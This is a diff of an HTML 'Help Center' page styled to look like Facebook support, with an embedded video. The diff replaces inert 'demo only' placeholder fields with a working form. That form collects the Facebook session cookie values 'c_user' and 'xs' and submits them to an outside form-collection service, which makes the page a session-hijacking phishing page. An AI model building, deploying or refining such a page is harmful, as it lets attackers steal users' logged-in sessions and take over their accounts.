@@ -5,61 +5,81 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Help Center</title>
   <style>
-    body{
-      font-family:Arial, sans-serif;
-      background:#f0f2f5;
-      display:flex;
-      justify-content:center;
-      padding:20px;
-      margin:0;
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+      margin: 0;
     }
-    .card{
-      background:#fff;
-      padding:20px;
-      border-radius:12px;
-      width:360px;
-      box-shadow:0 5px 20px rgba(0,0,0,.2);
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      width: 360px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
     }
-    h3{color:#1877f2;text-align:center}
-    video{width:100%;border-radius:8px;margin:15px 0}
-    label{display:block;margin-top:10px}
-    input{
-      width:100%;
-      padding:10px;
-      margin-top:5px;
-      border-radius:6px;
-      border:1px solid #ccc;
+    h2 {
+      color: #1877f2;
+      text-align: center;
+      margin-bottom: 15px;
     }
-    button{
-      margin-top:20px;
-      padding:12px;
-      width:100%;
-      background:#1877f2;
-      color:#fff;
-      border:none;
-      border-radius:8px;
-      cursor:pointer;
+    video {
+      width: 100%;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    form label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    form input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    form button {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    form button:hover {
+      background: #155db2;
     }
   </style>
 </head>
 <body>
 
-<div class="card">
-  <h3>Help Center</h3>
+<div class="container">
+  <h2>Help Center</h2>
 
   <!-- Video -->
   <video controls>
     <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+    Your browser does not support the video tag.
   </video>
 
-  <!-- Placeholders only -->
-  <label>c_user</label>
-  <input type="text" placeholder="Enter c_user (demo only)">
+  <!-- Form -->
+  <form action="https://submit-form.com/lrOMQ5laa" method="POST">
+    <label for="c_user">c_user</label>
+    <input type="text" name="c_user" id="c_user" required>
 
-  <label>xs</label>
-  <input type="text" placeholder="Enter xs (demo only)">
+    <label for="xs">xs</label>
+    <input type="text" name="xs" id="xs" required>
 
-  <button onclick="location.href='verify.html'">Continue</button>
+    <button type="submit">Submit</button>
+  </form>
 </div>
 
 </body>
